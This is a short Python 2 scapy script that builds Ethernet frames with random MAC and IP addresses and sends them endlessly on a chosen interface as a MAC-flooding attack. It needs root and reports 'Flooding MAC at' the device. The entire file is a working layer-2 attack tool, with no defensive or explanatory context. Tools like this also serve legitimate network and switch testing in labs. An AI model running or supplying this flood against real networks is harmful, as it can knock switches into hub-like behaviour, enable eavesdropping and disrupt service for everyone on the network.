#!/usr/bin/python

import sys
import os
from scapy.all import *

if os.geteuid() != 0:
        exit("You need to root privileges")

packet = Ether(src=RandMAC("*:*:*:*:*:*"),
        dst=RandMAC("*:*:*:*:*:*")) / \
        IP(src=RandIP("*.*.*.*"),
        dst=RandIP("*.*.*.*")) / \
            ICMP()

if len(sys.argv) < 2:
    dev = "wlp2s0" # Set networking interface
else:
    dev = sys.argv[1]
print "\n Press Crtl+C to stop\n"
print "Flooding MAC at " + dev
sendp(packet, iface=dev, loop=1)
